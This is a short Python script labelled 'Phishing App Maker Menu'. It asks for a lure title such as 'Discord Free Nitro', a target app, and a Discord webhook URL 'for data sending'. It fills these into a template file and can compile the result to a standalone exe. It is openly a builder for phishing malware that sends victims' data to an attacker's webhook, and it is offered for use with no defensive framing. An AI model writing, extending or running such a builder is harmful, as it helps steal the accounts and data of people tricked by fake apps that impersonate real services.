import os
print("Phishing App Maker Menu v1.0.0\n")
title = input("App Title (Example: Discord Free Nitro): ")
targetname = input("Target App (Example: Discord): ")
webhook = input("Discord Webhook URL (For data sending): ")
with open("index.py", "r") as f:
	data = f.read().replace("myAppTitle", title).replace("myAppName", targetname).replace("dc_webhook_url", webhook)
with open("index.py", "w") as f:
	f.write(data)
print("Sucessfuly √")
quest = input("Convert to exe file? (Y/n): ").lower()
if quest == "y":
	os.system("pip install pyinstaller")
	os.system("python -m PyInstaller --onefile index.py")
	print("\nSucessfuly! Your file is in dist folder.")
print("\nGood Bye!")
